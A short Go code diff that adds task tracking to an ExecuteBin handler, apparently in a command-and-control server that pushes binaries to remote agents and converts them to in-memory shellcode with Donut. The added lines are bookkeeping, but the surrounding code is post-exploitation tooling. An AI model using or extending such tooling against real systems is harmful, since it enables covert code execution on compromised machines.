@@ -206,6 +206,13 @@ func ExecuteBin(c *gin.Context) {
 
 	auditBinExecute(c, "START", mode, uid, file.Filename, len(fileBytes), args, "")
 
+	// 任务记录（kind=exec）：成功投递后保持 dispatched，客户端回显时由 OnTaskOutput 置 completed
+	var execTaskID int64
+	if _, rows := createTaskRows([]string{uid}, operatorFromContext(c), "exec",
+		mode+" "+file.Filename+" "+args); len(rows) > 0 {
+		execTaskID = rows[0].Id
+	}
+
 	// 记录到 shell 历史（校验通过后再写：原来非法 mode 也会污染历史）
 	database.AppendShellContent(uid, "$ "+mode+" "+file.Filename+" "+args+"\n")
 
@@ -214,6 +221,7 @@ func ExecuteBin(c *gin.Context) {
 	finish := func(payload []byte) {
 		if err := sendcommand.SendFileUploadCommandChecked(uid, payload); err != nil {
 			logx.Warnf("❌ [BIN-EXECUTE] 载荷下发失败: uid=%s mode=%s err=%v\n", uid, mode, err)
+			finishTask(execTaskID, taskStatusFailed, "", err.Error())
 			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, err.Error())
 			c.JSON(http.StatusServiceUnavailable, gin.H{"status": 503, "data": "命令下发失败: " + err.Error()})
 			return
@@ -241,6 +249,7 @@ func ExecuteBin(c *gin.Context) {
 		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
 		if err != nil {
 			errorMsg := fmt.Sprintf("Unable to generate shellcode for %s: %v\n\nInline Bin mode requires files that can be converted to shellcode.\n\nFor fscan.exe and similar tools, please:\n1. Use traditional file upload and execution\n2. Convert to shellcode format first\n3. Use a shellcode generator tool", file.Filename, err)
+			finishTask(execTaskID, taskStatusFailed, "", "Donut 转换失败: "+err.Error())
 			auditBinExecute(c, "FAILURE", mode, uid, file.Filename, len(fileBytes), args, "Donut 转换失败: "+err.Error())
 			c.JSON(http.StatusOK, gin.H{"status": 400, "data": errorMsg})
 			return
